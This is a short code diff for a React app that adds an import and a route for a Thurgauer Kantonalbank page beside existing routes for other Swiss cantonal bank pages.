@@ -43,6 +43,7 @@ import ChObwaldnerKantonalbank from "./pages/ChObwaldnerKantonalbank.tsx";
 import ChSchaffhauserKantonalbank from "./pages/ChSchaffhauserKantonalbank.tsx";
 import ChSchwyzerKantonalbank from "./pages/ChSchwyzerKantonalbank.tsx";
 import ChStGallerKantonalbank from "./pages/ChStGallerKantonalbank.tsx";
+import ChThurgauerKantonalbank from "./pages/ChThurgauerKantonalbank.tsx";
 import ChBasellandschaftlicheKantonalbank from "./pages/ChBasellandschaftlicheKantonalbank.tsx";
 import ChBaslerKantonalbank from "./pages/ChBaslerKantonalbank.tsx";
 import ChBernerKantonalbank from "./pages/ChBernerKantonalbank.tsx";
@@ -165,6 +166,7 @@ const App = () => (
             <Route path="/ch/berner-kantonalbank" element={<P><ChBernerKantonalbank /></P>} />
             <Route path="/ch/glarner-kantonalbank" element={<P><ChGlarnerKantonalbank /></P>} />
             <Route path="/ch/graubuendner-kantonalbank" element={<P><ChGraubuendnerKantonalbank /></P>} />
+            <Route path="/ch/thurgauer-kantonalbank" element={<P><ChThurgauerKantonalbank /></P>} />
 
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
